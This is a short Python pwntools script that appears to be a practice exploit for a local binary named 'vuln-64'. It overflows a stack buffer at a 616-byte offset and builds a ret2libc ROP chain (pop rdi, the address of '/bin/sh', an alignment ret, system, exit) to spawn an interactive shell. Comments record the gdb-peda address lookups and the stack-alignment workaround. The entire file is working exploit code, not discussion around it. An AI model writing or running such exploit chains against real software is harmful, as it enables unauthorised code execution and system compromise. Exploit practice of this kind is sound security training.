#!/usr/bin/env python3

from pwn import *

# WE can cause an overflow with 612 bytes + EIP
offset=616

#gdb-peda$ p system
#$4 = {int (const char *)} 0x7ffff7e0f330 <__libc_system>
#gdb-peda$ p exit
#$5 = {void (int)} 0x7ffff7e01590 <__GI_exit>
#gdb-peda$ find /bin/sh
#Searching for '/bin/sh' in: None ranges
#Found 1 results, display max 1 items:
#libc.so.6 : 0x7ffff7f59031 --> 0x68732f6e69622f ('/bin/sh')
# ropsearch "pop rdi" libcbae libcend

# Due to stack alignment of ubuntu to 16 byte we need to jump 8 addditional 8 bytes on the satck using a return
# (see https://ropemporium.com/guide.html in section "The MOVAPS issue")
# So the chain is
# pop rdi; ret
# argument to system to be popped into RDI
# additional return
# system()


pop_rdi=      (0x00007ffff7df7999)
addr_ret=     (0x0000000000401016)
addr_system = (0x00007ffff7e0f330)
addr_exit =   (0x00007ffff7e01590)
addr_binsh =  (0x00007ffff7f59031)
zero_arg =    (0x0000000000000000)

payload = b"A"*offset
payload += p64(pop_rdi)
payload += p64(addr_binsh)
payload += p64(addr_ret)
payload += p64(addr_system)
payload += p64(addr_exit)

r = process('./vuln-64')
r.sendline(payload)
r.interactive()
